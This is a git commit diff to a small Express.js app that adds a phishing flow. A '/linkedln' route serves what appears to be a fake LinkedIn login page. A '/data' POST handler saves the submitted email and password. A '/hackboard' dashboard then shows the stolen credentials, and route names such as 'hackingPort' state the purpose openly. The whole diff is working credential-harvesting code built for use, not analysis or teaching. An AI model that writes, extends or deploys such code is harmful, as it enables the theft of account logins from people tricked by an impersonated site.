776acf64fb31b2a8cee6ef94c8b76d94fa48240b
Shu12388y <spl.sp999@gmail.com>
2023-10-21 22:11:58 +0530

    file added

--- controller/controller.js
+++ controller/controller.js
@@ -2,16 +2,37 @@ const homeController = (req, res, next) => {
   res.render("index.ejs");
 };
 
+let username = "";
+let password = "";
+
 const hackPort = (req, res, next) => {
   res.render("hack.ejs");
 };
 
 const dashBoard = (req, res, next) => {
-  res.render("DashBoard.ejs");
+  res.render("DashBoard.ejs", {
+    username: username,
+    password: password,
+  });
+};
+
+const LoginForm = (req, res, next) => {
+  res.render("linkedln.ejs");
+};
+
+const postData = async (req, res, next) => {
+  username = await req.body.email;
+  password = await req.body.password;
+
+  if (username && password) {
+    res.redirect("hackboard");
+  }
 };
 
 module.exports = {
   homeController,
   hackPort,
   dashBoard,
+  LoginForm,
+  postData,
 };
--- routes/homeRoute.js
+++ routes/homeRoute.js
@@ -1,11 +1,27 @@
 const express = require("express");
 const route = express.Router();
-const { homeController, hackPort,dashBoard } = require("../controller/controller");
+
+const bodyPaser = require("body-parser");
+route.use(bodyPaser.urlencoded({ extended: false }));
+const {
+  homeController,
+  hackPort,
+  dashBoard,
+  LoginForm,
+  postData,
+} = require("../controller/controller");
 
 // define the home route
 route.get("/", homeController);
 
 route.get("/hackingPort", hackPort);
 
-route.get("/hackboard",dashBoard)
+route.get("/hackboard", dashBoard);
+
+route.get("/linkedln", LoginForm);
+
+route.post("/data", postData);
+
+
+
 module.exports = route;
